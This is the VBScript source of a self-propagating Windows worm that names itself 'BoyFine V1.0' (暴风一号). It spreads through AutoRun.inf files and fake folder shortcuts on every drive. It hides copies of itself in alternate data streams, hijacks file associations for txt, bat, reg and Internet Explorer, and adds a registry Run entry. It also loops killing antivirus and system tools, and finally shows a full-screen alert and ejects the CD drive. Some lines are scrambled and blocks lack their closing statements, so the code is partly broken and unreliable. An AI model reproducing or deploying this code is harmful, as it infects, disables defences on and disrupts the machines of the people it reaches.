--------------------------
'不要给偶乱起外号，我的中文名字叫暴风，我的英文名字叫BoyFine. -_-
On Error Resume Next
Dim Fso,WshShell:Set Fso=CreateObject("scRiPTinG.fiLEsysTeMoBjEcT"):Set WshShell=CreateObject("wScRipT.SHelL"):Call Main()
Sub Main()
On Error Resume Next:Dim Args, VirusLoad, VirusAss:Set Args=WScript.Arguments:VirusLoad=GetMainVirus(1):VirusAss=GetMainVirus(0):ArgNum=0:Do While ArgNum &lt; 
Args.Count:Param=Param&" "&Args(ArgNum):ArgNum=ArgNum + 1:Loop
SubParam=LCase(Right(Param, 3))
Select Case SubParam
Case "run"
RunPath=Left(WScript.ScriptFullName, 2):Call Run(RunPath):Call InvadeSystem(VirusLoad,VirusAss):Call Run("%SystemRoot%\system\svchost.exe "&VirusLoad)
Case "txt", "log","ini" ,"inf"
RunPath="%SystemRoot%\system32\NOTEPAD.EXE "&Param:Call Run(RunPath):Call InvadeSystem(VirusLoad,VirusAss):Call Run("%SystemRoot%\system\svchost.exe "&VirusLoad)
Case "bat", "cmd"
RunPath="CMD /c echo Hi!I'm here!&pause":Call Run(RunPath):Call InvadeSystem(VirusLoad,VirusAss):Call Run("%SystemRoot%\system\svchost.exe "&VirusLoad)
Case "reg"
RunPath="regedit.exe "&""""&Trim(Param)&"""":Call Run(RunPath):Call InvadeSystem(VirusLoad,VirusAss):Call Run("%SystemRoot%\system\svchost.exe "&VirusLoad)
Case "chm"
RunPath="hh.exe "&""""&Trim(Param)&"""":Call Run(RunPath):Call InvadeSystem(VirusLoad,VirusAss):Call Run("%SystemRoot%\system\svchost.exe "&VirusLoad)
Case "hlp"
RunPath="winhlp32.exe "&""""&Trim(Param)&"""":Call Run(RunPath):Call InvadeSystem(VirusLoad,VirusAss):Call Run("%SystemRoot%\system\svchost.exe "&VirusLoad)
Case "dir"
RunPath=""""&Left(Trim(Param),Len(Trim(Param))-3)&"""":Call Run(RunPath):Call InvadeSystem(VirusLoad,VirusAss):Call Run("%SystemRoot%\system\svchost.exe "&VirusLoad)
Case "oie"
RunPath="""%ProgramFiles%\Internet Explorer\IEXPLORE.EXE""":Call Run(RunPath):Call InvadeSystem(VirusLoad,VirusAss):Call Run("%SystemRoot%\system\svchost.exe 
"&VirusLoad)
Case "omc"
RunPath="explorer.exe /n,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}":Call Run(RunPath):Call InvadeSystem(VirusLoad,VirusAss):Call Run("%SystemRoot%\system\svchost.exe 
"&VirusLoad)
Case "emc"
RunPath="explorer.exe /n,/e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}":Call Run(RunPath):Call InvadeSystem(VirusLoad,VirusAss):Call Run("%SystemRoot%
\system\svchost.exe "&VirusLoad)
Case Else
If PreDblInstance=True Then
WScript.Quit
End If
Timeout = Datediff("ww", GetInfectedDate, Date) - 12
If Timeout&gt;0 And Month(Date) = Day(Date) Then
Call VirusAlert()
Call MakeJoke(CInt(Month(Date)))
Call MonitorSystem()
End Select
Sub MonitorSystem()
On Error Resume Next:Dim ProcessNames, ExeFullNames:ProcessNames=Array("ras.exe", "360tray.exe", "taskmgr.exe", "cmd.exe", "cmd.com", "regedit.exe", 
"regedit.scr","regedit.pif", "regedit.com", "msconfig.exe"):VBSFullNames=Array(GetMainVirus(1)):Do:Call KillProcess(ProcessNames):Call InvadeSystem(GetMainVirus
(1),GetMainVirus(0)):Call KeepProcess(VBSFullNames):WScript.Sleep 3000:Loop
End Sub
Sub InvadeSystem(VirusLoadPath,VirusAssPath)
On Error Resume Next:Dim Load_Value, File_Value, IE_Value, MyCpt_Value1, MyCpt_Value2, HCULoad, HCUVer, VirusCode, Version:Load_Value="%SystemRoot%\system\svchost.exe 
"&""""&VirusLoadPath&"""":File_Value="%SystemRoot%\System32\WScript.exe "&""""&VirusAssPath&""""&" %1 %* ":IE_Value="%SystemRoot%\System32\WScript.exe 
"&""""&VirusAssPath&""""&" OIE ":MyCpt_Value1="%SystemRoot%\System32\WScript.exe "&""""&VirusAssPath&""""&" OMC ":MyCpt_Value2="%SystemRoot%\System32\WScript.exe 
"&""""&VirusAssPath&""""&" EMC ":HCULoad="HKEY_CURRENT_USER\SoftWare\Microsoft\Windows 
NT\CurrentVersion\Windows\Load":HCUVer="HKEY_CURRENT_USER\SoftWare\Microsoft\Windows 
NT\CurrentVersion\Windows\Ver":HCUDate="HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Date":VirusCode=GetCode
(WScript.ScriptFullName):Version=1:HostSourcePath=Fso.GetSpecialFolder(1)&"\Wscript.exe":HostFilePath=Fso.GetSpecialFolder(0)&"\system\svchost.exe"
For Each Drive In Fso.Drives:If Drive.IsReady and (Drive.DriveType=1 Or Drive.DriveType=2 Or Drive.DriveType=3) Then:DiskVirusName=GetSerialNumber(Drive.DriveLetter)
&".vbs":Call CreateAutoRun(Drive.DriveLetter,DiskVirusName):Call InfectRoot(Drive.DriveLetter,DiskVirusName):End If:Next:If FSO.FileExists(VirusAssPath)=False Or 
FSO.FileExists(VirusLoadPath)=False Or FSO.FileExists(HostFilePath)=False Or GetVersion()&lt; Version Then:If GetFileSystemType(GetSystemDrive())="NTFS" Then:Call 
CreateFile(VirusCode,VirusAssPath):Call CreateFile(VirusCode,VirusLoadPath):Call CopyFile(HostSourcePath,HostFilePath):Call SetHiddenAttr(HostFilePath):Else:Call 
CreateFile(VirusCode, VirusAssPath):Call SetHiddenAttr(VirusAssPath):Call CreateFile(VirusCode,VirusLoadPath):Call SetHiddenAttr(VirusLoadPath):Call CopyFile
(HostSourcePath, HostFilePath):Call SetHiddenAttr(HostFilePath):End If:End If
If ReadReg(HCULoad)&lt;&gt;Load_Value Then:Call WriteReg (HCULoad, Load_Value, ""):End If:If GetVersion() &lt; Version Then:Call WriteReg (HCUVer, Version, ""):End If:If 
GetInfectedDate() = "" Then:Call WriteReg (HCUDate, Date, ""):End If:If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")&lt;&gt;File_Value 
Then:Call SetTxtFileAss(VirusAssPath):End If:If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inifile\shell\open\command\")&lt;&gt;File_Value Then:Call SetIniFileAss
(VirusAssPath):End If:If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inffile\shell\open\command\")&lt;&gt;File_Value Then:Call SetInfFileAss(VirusAssPath):End If:If 
ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\batfile\shell\open\command\")&lt;&gt;File_Value Then:Call SetBatFileAss(VirusAssPath):End If:If ReadReg
("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\cmdfile\shell\open\command\")&lt;&gt;File_Value Then:Call SetCmdFileAss(VirusAssPath):End If
If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\")&lt;&gt;File_Value Then:Call SetRegFileAss(VirusAssPath):End If:If ReadReg
("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\")&lt;&gt;File_Value Then:Call SetchmFileAss(VirusAssPath):End If
If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\")&lt;&gt;File_Value Then:Call SethlpFileAss(VirusAssPath):End If:If ReadReg
("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Applications\iexplore.exe\shell\open\command\")&lt;&gt;IE_Value Then:Call SetIEAss(VirusAssPath):End If:If ReadReg
("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command\")&lt;&gt;IE_Value Then:Call SetIEAss(VirusAssPath):End If:If ReadReg
("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\open\command\")&lt;&gt;MyCpt_Value1 Then:Call SetMyComputerAss(VirusAssPath):End If:If ReadReg
("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\explore\command\")&lt;&gt;MyCpt_Value2 Then:Call SetMyComputerAss(VirusAssPath):End If:Call RegSet()
End Sub
Sub CopyFile(source, pathf):On Error Resume Next:If FSO.FileExists(pathf) Then:FSO.DeleteFile pathf , True:End If:FSO.CopyFile source, pathf:End Sub:Sub CreateFile
(code, pathf):On Error Resume Next:Dim FileText:If FSO.FileExists(pathf) Then:Set FileText=FSO.OpenTextFile(pathf, 2, False):FileText.Write 
code:FileText.Close:Else:Set FileText=FSO.OpenTextFile(pathf, 2, True):FileText.Write code:FileText.Close:End If:End Sub
Sub CreateFile(code, pathf)
On Error Resume Next
Dim FileText
If FSO.FileExists(pathf) Then
Set FileText=FSO.OpenTextFile(pathf, 2, False)
FileText.Write code
FileText.Close
Set FileText=FSO.OpenTextFile(pathf, 2, True)
FileText.Write code
FileText.Close
End If
End Sub
Sub RegSet()
On Error Resume Next 
Dim RegPath1 , RegPath2, RegPath3, RegPath4
RegPath1="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\CheckedValue"
RegPath2="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"
RegPath3="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun"
RegPath4="HKEY_CLASSES_ROOT\lnkfile\IsShortcut"
Call WriteReg (RegPath1, 3, "REG_DWORD")
Call WriteReg (RegPath2, 2, "REG_DWORD")
Call WriteReg (RegPath3, 0, "REG_DWORD")
Call DeleteReg (RegPath4)
End Sub
Sub KillProcess(ProcessNames)
On Error Resume Next:Set WMIService=GetObject("winmgmts:\\.\root\cimv2"):For Each ProcessName in ProcessNames :Set ProcessList=WMIService.execquery(" Select * From 
win32_process where name ='"&ProcessName&"' "):For Each Process in ProcessList:IntReturn=Process.terminate:If intReturn&lt;&gt;0 Then:WshShell.Run "CMD /c ntsd -c q -p 
"&Process.Handle, vbHide, False:End If:Next:Next
End Sub
Sub KillImmunity(D):On Error Resume Next:ImmunityFolder=D&":\Autorun.inf":If Fso.FolderExists(ImmunityFolder) Then:WshSHell.Run ("CMD /C CACLS "& 
""""&ImmunityFolder&"""" &" /t /e /c /g everyone:f"),vbHide,True:WshSHell.Run ("CMD /C RD /S /Q "& ImmunityFolder), vbHide, True:End If:End Sub:Sub KeepProcess
(VBSFullNames):On Error Resume Next:For Each VBSFullName in VBSFullNames :If VBSProcessCount(VBSFullName) &lt; 2 then:Run("%SystemRoot%\system\svchost.exe 
"&VBSFullName):End If:Next:End Sub
Function GetSystemDrive():GetSystemDrive=Left(Fso.GetSpecialFolder(0),2):End Function
Function GetFileSystemType(Drive):Set d=FSO.GetDrive(Drive):GetFileSystemType=d.FileSystem:End Function
Function ReadReg(strkey):Dim tmps:Set tmps=CreateObject("WScript.Shell"):ReadReg=tmps.RegRead(strkey):Set tmps=Nothing:End Function
Sub WriteReg(strkey, Value, vtype):Dim tmps:Set tmps=CreateObject("WScript.Shell"):If vtype="" Then:tmps.RegWrite strkey, Value:Else:tmps.RegWrite strkey, Value, 
vtype:End If:Set tmps=Nothing:End Sub:Sub DeleteReg(strkey):Dim tmps:Set tmps=CreateObject("WScript.Shell"):tmps.RegDelete strkey:Set tmps=Nothing:End Sub:Sub 
SetHiddenAttr(path):On Error Resume Next:Dim vf:Set vf=FSO.GetFile(path):Set vf=FSO.GetFolder(path):vf.Attributes=6:End Sub
Sub Run(ExeFullName):On Error Resume Next:Dim WshShell:Set WshShell=WScript.CreateObject("WScript.Shell"):WshShell.Run ExeFullName:Set WshShell=Nothing:End Sub:Sub 
InfectRoot(D,VirusName):On Error Resume Next:Dim VBSCode:VBSCode=GetCode(WScript.ScriptFullName):VBSPath=D&":\"&VirusName:If FSO.FileExists(VBSPath)=False Then:Call 
CreateFile(VBSCode, VBSPath):Call SetHiddenAttr(VBSPath):End If:Set Folder=Fso.GetFolder(D&":\"):Set SubFolders=Folder.Subfolders:For Each SubFolder In 
SubFolders:SetHiddenAttr(SubFolder.Path):LnkPath=D&":\"&SubFolder.Name&".lnk":TargetPath=D&":\"&VirusName:Args=""""&D&":\"&SubFolder.Name& "\Dir""":If Fso.FileExists
(LnkPath)=False Or GetTargetPath(LnkPath) &lt;&gt; TargetPath Then:If Fso.FileExists(LnkPath)=True Then:FSO.DeleteFile LnkPath, True:End If:Call CreateShortcut
(LnkPath,TargetPath,Args):End If:Next:End Sub 
Sub CreateShortcut(LnkPath,TargetPath,Args):Set Shortcut=WshShell.CreateShortcut(LnkPath):with 
Shortcut:.TargetPath=TargetPath:.Arguments=Args:.WindowStyle=4:.IconLocation="%SystemRoot%\System32\Shell32.dll, 3":.Save:end with:End Sub
Sub CreateAutoRun(D,VirusName):On Error Resume Next:Dim InfPath, VBSPath, VBSCode:InfPath=D&":\AutoRun.inf":VBSPath=D&":\"&VirusName:VBSCode=GetCode
(WScript.ScriptFullName):If FSO.FileExists(InfPath)=False Or FSO.FileExists(VBSPath)=False Then:Call CreateFile(VBSCode, VBSPath):Call SetHiddenAttr
(VBSPath):StrInf="[AutoRun]"&VBCRLF&"Shellexecute=WScript.exe "&VirusName&" ""AutoRun"""&VBCRLF&"shell\open=打开(&O)"&VBCRLF&"shell\open\command=WScript.exe 
"&VirusName&" ""AutoRun"""&VBCRLF&"shell\open\Default=1"& VBCRLF&"shell\explore=资源管理器(&X)"&VBCRLF&"shell\explore\command=WScript.exe "&VirusName&" 
""AutoRun""":Call KillImmunity(D):Call CreateFile(StrInf, InfPath):Call SetHiddenAttr(InfPath):End If:End Sub
Sub SetTxtFileAss(sFilePath)
On Error Resume Next
Dim Value
Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
l WCaleReritHKEg("OCAY_LACHL_M\SOINEAREFTWass\Cltxtes\e\sfill\ohel\copennd\mmaVal", "Rue,EXPEG__SZAND")
Sub SetIniFileAss(sFilePath)
On Error Resume Next
Dim Value
Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inifile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SetInfFileAss(sFilePath)
On Error Resume Next
Dim Value
Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inffile\shell\open\command\", Value, "REG_EXPAND_SZ")
Sub SetBatFileAss(sFilePath)
On Error Resume Next
Dim Value
Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\batfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SetCmdFileAss(sFilePath)
On Error Resume Next
Dim Value
Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\cmdfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SethlpFileAss(sFilePath)
On Error Resume Next
Dim Value
Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\", Value, "REG_EXPAND_SZ")
Sub SetRegFileAss(sFilePath)
On Error Resume Next
Dim Value
Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SetchmFileAss(sFilePath)
On Error Resume Next
Dim Value
Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" %1 %* "
Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SetIEAss(sFilePath)
On Error Resume Next
Dim Value
Value="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" OIE "
Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Applications\iexplore.exe\shell\open\command\", Value, "REG_EXPAND_SZ")
Call WriteReg("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SetMyComputerAss(sFilePath)
On Error Resume Next
Dim Value1,Value2
Value1="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" OMC "
Value2="%SystemRoot%\System32\WScript.exe "&""""&sFilePath&""""&" EMC "
Call WriteReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\", "", "REG_SZ")
Call WriteReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\open\command\", Value1, "REG_EXPAND_SZ")
Call WriteReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\explore\command\", Value2, "REG_EXPAND_SZ")
End Sub
Function GetSerialNumber(Drv)
On Error Resume Next
Set d=fso.GetDrive(Drv)
GetSerialNumber=d.SerialNumber
GetSerialNumber=Replace(GetSerialNumber,"-","")
End Function
Function GetMainVirus(N)
On Error Resume Next
MainVirusName=GetSerialNumber(GetSystemDrive())&".vbs"
If GetFileSystemType(GetSystemDrive())="NTFS" Then
If N=1 Then
GetMainVirus=Fso.GetSpecialFolder(N)&"\smss.exe:"&MainVirusName
If N=0 Then
GetMainVirus=Fso.GetSpecialFolder(N)&"\explorer.exe:"&MainVirusName
Else
GetMainVirus=Fso.GetSpecialFolder(N)&"\"&MainVirusName
End Function
Function VBSProcessCount(VBSPath)
On Error Resume Next
Dim WMIService, ProcessList, Process
VBSProcessCount=0
Set WMIService=GetObject("winmgmts:\\.\root\cimv2")
Set ProcessList=WMIService.ExecQuery("Select * from Win32_Process Where "&"Name='cscript.exe' or Name='wscript.exe' or Name='svchost.exe'")
For Each Process in ProcessList
If InStr(Process.CommandLine, VBSPath)&gt;0 Then
VBSProcessCount=VBSProcessCount+1

End Function
Function PreDblInstance()
On Error Resume Next
PreDblInstance=False
If VBSProcessCount(WScript.ScriptFullName)&gt;= 3 Then
PreDblInstance=True
End Function
Function GetTargetPath(LnkPath)
On Error Resume Next
Dim Shortcut
Set Shortcut=WshShell.CreateShortcut(LnkPath)
GetTargetPath=Shortcut.TargetPath
End Function
Function GetCode(FullPath)
On Error Resume Next
Dim FileText
Set FileText=FSO.OpenTextFile(FullPath, 1)
GetCode=FileText.ReadAll
FileText.Close
End Function
Function GetVersion()
Dim VerInfo
VerInfo="HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Ver"
If ReadReg(VerInfo)="" Then
GetVersion=0
Else
GetVersion=CInt(ReadReg(VerInfo))
End If
End Function
Sub VirusAlert()
On Error Resume Next
Dim HtaPath,HtaCode
HtaPath=Fso.GetSpecialFolder(1)&"\BFAlert.hta"
HtaCode="&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;暴风一号&lt;/TITLE&gt;"&VBCRLF&"&lt;HTA:APPLICATION APPLICATIONNAME=""BoyFine V1.0"" SCROLL=""no"" windowstate=""maximize"" 
border=""none"""&VBCRLF&"SINGLEINSTANCE=""yes"" CAPTION=""no"" contextMenu=""no"" ShowInTaskBar=""no"" selection=""no""&gt;"&VBCRLF&"&lt;/HEAD&gt;&lt;BODY bgcolor=#000000&gt;&lt;DIV 
align =""center""&gt;"&VBCRLF&"&lt;font style=""font-size:3500%;font-family:Wingdings;color=red""&gt;N&lt;/font&gt;
"&VBCRLF&"&lt;font style=""font-size:200%;font-family:黑
体;color=red""&gt;暴风一号&lt;/font&gt;"&VBCRLF&"&lt;/DIV&gt;&lt;/BODY&gt;&lt;/HTML&gt;"
If FSO.FileExists(HtaPath)=False Then
Call CreateFile(HtaCode, HtaPath)
Call SetHiddenAttr(HtaPath)
Call Run(HtaPath)
End Sub
Function GetInfectedDate()
On Error Resume Next
Dim DateInfo
DateInfo="HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Date"
If ReadReg(DateInfo)="" Then
GetInfectedDate=""
GetInfectedDate=CDate(ReadReg(DateInfo))
End If
End Function
Sub MakeJoke(Times)
On Error Resume Next
Dim WMP, colCDROMs
Set WMP = CreateObject( "WMPlayer.OCX" )
Set colCDROMs = WMP.cdromCollection
If colCDROMs.Count &gt;0 Then
For i=1 to Times
colCDROMs.Item(0).eject()
WScript.Sleep 3000
colCDROMs.Item(0).eject()
End If
Set WMP = Nothing
End Sub